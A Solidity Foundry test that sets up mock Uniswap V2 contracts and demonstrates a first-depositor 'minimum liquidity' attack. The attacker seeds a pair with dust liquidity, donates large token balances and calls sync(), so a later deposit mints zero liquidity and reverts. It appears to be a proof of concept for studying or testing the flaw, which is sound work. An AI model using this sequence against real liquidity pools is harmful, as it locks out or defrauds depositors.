// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "test/Mock/WETH.sol";
import {ERC20Token} from "test/Mock/ERC20Token.sol";
import {UniswapV2Pair} from "test/Mock/UniswapV2Pair.sol";
import {UniswapV2Factory} from "test/Mock/UniswapV2Factory.sol";
import {UniswapV2Router02, UniswapV2Library} from "test/Mock/UniswapV2Router02.sol";

contract MINIMUM_LIQUIDITY_ATTACK_TEST is Test {
    ERC20Token tokenA;
    ERC20Token tokenB;

    WETH weth;

    UniswapV2Factory factory;
    UniswapV2Router02 router;
    UniswapV2Pair pair;

    function setUp() public {
        weth = new WETH();
        vm.label(address(weth), "weth");

        factory = new UniswapV2Factory(address(this));
        vm.label(address(factory), "factory");

        router = new UniswapV2Router02(address(factory), address(weth));
        vm.label(address(router), "router");

        tokenA = new ERC20Token("ETH", "tokenA", 18);
        vm.label(address(tokenA), "tokenA");
        tokenA.mint(address(this), 100_000_000 ether);
        tokenA.approve(address(router), type(uint256).max);

        tokenB = new ERC20Token("DAI", "tokenB", 18);
        vm.label(address(tokenB), "tokenB");
        tokenB.mint(address(this), 100_000_000 ether);
        tokenB.approve(address(router), type(uint256).max);

        get_UniswapV2Pair_init_code_hash();
    }

    function get_UniswapV2Pair_init_code_hash() internal pure {
        // to change UniswapV2Library pairFor function create2 init code hash
        console.log(
            "Remember to change the create2 initialization code hash of the pairFor function in the UniswapV2Library."
        );
        console.log("UniswapV2Pair init code hash:");
        console.logBytes32(keccak256(type(UniswapV2Pair).creationCode));
    }

    function test_MINIMUM_LIQUIDITY_ATTACK() public {
        pair = UniswapV2Pair(UniswapV2Library.pairFor(address(factory), address(tokenA), address(tokenB)));
        vm.label(address(pair), "pair");

        {
            uint256 amountADesired = 1 wei;
            uint256 amountBDesired = 3350 wei;
            uint256 amountAMin = 0;
            uint256 amountBMin = 0;
            address to = address(this);
            uint256 deadline = block.timestamp + 42 seconds;
            router.addLiquidity(
                address(tokenA), address(tokenB), amountADesired, amountBDesired, amountAMin, amountBMin, to, deadline
            );
        }

        tokenA.transfer(address(pair), 100 ether);
        tokenB.transfer(address(pair), 335_000 ether);
        pair.sync();

        console.log("pair totalSupply: %d", pair.totalSupply());

        {
            uint256 amountADesired = 1 ether;
            uint256 amountBDesired = 3_350 ether;
            uint256 amountAMin = 0;
            uint256 amountBMin = 0;
            address to = address(this);
            uint256 deadline = block.timestamp + 42 seconds;

            vm.expectRevert("UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"); // because liquidity equals 0
            router.addLiquidity(
                address(tokenA), address(tokenB), amountADesired, amountBDesired, amountAMin, amountBMin, to, deadline
            );
        }
    }
}
